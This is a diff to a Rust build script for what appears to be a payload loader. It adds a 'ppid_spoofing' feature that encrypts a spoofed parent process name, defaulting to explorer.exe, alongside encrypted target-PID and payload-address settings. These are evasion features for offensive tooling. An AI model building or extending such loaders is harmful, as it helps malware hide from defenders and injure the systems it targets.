@@ -19,7 +19,8 @@ fn main() {
         "RSL_ICON_PATH",
         "RSL_BUNDLE_FILE",
         "RSL_BUNDLE_FILENAME",
-        "RSL_DEFAULT_PAYLOAD_ADDRESS"
+        "RSL_DEFAULT_PAYLOAD_ADDRESS",
+        "RSL_PARENT_PROCESS_NAME"
     ];
 
     for var in &env_vars {
@@ -49,6 +50,12 @@ fn main() {
     if env::var("CARGO_FEATURE_PATTERN3").is_ok() {
         let target_pid = env::var("RSL_TARGET_PID").unwrap_or_else(|_| "0".to_string());
         println!("cargo:rustc-env=RSL_ENCRYPTED_TARGET_PID={}", simple_encrypt(target_pid.as_bytes()));
+    }
+
+    // Encrypt parent process name if ppid_spoofing feature is enabled
+    if env::var("CARGO_FEATURE_PPID_SPOOFING").is_ok() {
+        let parent_process_name = env::var("RSL_PARENT_PROCESS_NAME").unwrap_or_else(|_| "explorer.exe".to_string());
+        println!("cargo:rustc-env=RSL_ENCRYPTED_PARENT_PROCESS_NAME={}", simple_encrypt(parent_process_name.as_bytes()));
     }
 
     // Conditional compilation tasks
